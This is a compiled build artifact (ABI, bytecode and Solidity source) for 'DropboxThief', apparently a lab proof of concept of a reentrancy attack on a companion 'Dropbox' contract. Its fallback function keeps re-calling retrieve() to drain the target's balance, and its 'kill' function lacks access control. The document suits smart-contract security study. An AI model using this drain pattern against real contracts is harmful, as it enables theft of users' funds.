{
  "contractName": "DropboxThief",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "dropbox",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_dropbox",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "collect",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806103e88339810180604052602081101561003057600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610357806100916000396000f3fe608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806341c0e1b514610138578063509545751461014f578063e5225381146101a6575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101515610136576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e64cec16040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561011d57600080fd5b505af1158015610131573d6000803e3d6000fd5b505050505b005b34801561014457600080fd5b5061014d6101b0565b005b34801561015b57600080fd5b506101646101c9565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101ae6101ee565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f751cd8f346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561027357600080fd5b505af1158015610287573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e64cec16040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561031157600080fd5b505af1158015610325573d6000803e3d6000fd5b5050505056fea165627a7a72305820e8193fd93ec8ea46100167e2040d91aa284490e61718b5a838485741ddc5feac0029",
  "source": "pragma solidity ^0.5.0;\n\nimport \"./Dropbox.sol\";\n\ncontract DropboxThief {\n  DropBox public dropbox;\n\n  constructor (address payable _dropbox) public {\n    dropbox = DropBox(_dropbox);\n  }\n\n  function kill () public {\n    selfdestruct(msg.sender);\n  }\n\n  function collect() public payable {\n    dropbox.drop.value(msg.value)();\n    dropbox.retrieve();\n  }\n\n  function () external payable {\n    if (address(dropbox).balance >= msg.value) {\n      dropbox.retrieve();\n    }\n  }\n}\n",
  "sourcePath": "/home/INEAT-CONSEIL.FR/alexandrevan/ilab/poc-blockchain/ethereum/ethereum-reentrancy/contracts/DropboxThief.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.0.1",
  "updatedAt": "2019-01-25T09:07:46.528Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}